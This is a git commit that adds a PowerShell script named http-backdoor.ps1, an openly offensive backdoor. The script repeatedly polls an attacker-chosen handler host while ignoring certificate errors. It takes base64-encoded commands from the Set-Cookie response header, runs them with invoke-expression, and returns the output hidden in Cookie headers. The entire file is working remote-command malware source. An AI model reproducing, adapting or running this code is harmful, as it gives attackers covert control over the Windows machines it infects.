ba823e2657611b77970cbb277be1dc6dda082d54
cyberhunter00 <m.anasqureshi@gmail.com>
2018-01-25 09:27:46 -0800

    Add files via upload

---
+++ http-backdoor.ps1
@@ -0,0 +1,51 @@
+#Your handler URL - edit as needed
+function http-backdoor {
+param(
+    [Parameter(Mandatory=$true)]
+    [string]
+    $protocol,
+	[Parameter(Mandatory=$true)]
+    [string]
+    $lhost,
+   [Parameter(Mandatory=$true)]
+    [string]
+    $lport
+  )
+$coma = ":"
+$url = "$protocol$coma//$lhost$coma$lport";  
+
+
+#Magic header - change as needed for both client and the server 
+$m = "737060cd8c284d8af7ad3082f209582d";
+Write-Host $url $response.StatusDescription
+function w 
+{ 
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+    $r = [System.Net.HttpWebRequest]::Create($url);
+    $r.Headers.Add('If-Match', $m);
+    $p = [System.Net.WebRequest]::GetSystemWebProxy();
+	# handle credetnails
+    $p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
+    $r.proxy = $proxy;
+    return $r;
+}
+
+while ($true)
+{
+    $r = w;
+    try { $p = $r.GetResponse(); } catch { continue; }
+    $x = $p.GetResponseHeader("Set-Cookie");
+    if (![string]::IsNullOrEmpty($x))
+    {
+        $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x));
+        #invoke and catch any exceptions
+		try { $o = invoke-expression "$c" 2>&1 | Out-String; }
+        catch { $o = $_.Exception| Out-String; }
+		# get output back to the server in cookie
+        $o = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($o))
+        $r = w;
+        $r.Headers.Add('Cookie', $o);
+        $r.GetResponse().close();
+    }
+    $p.close();
+}}
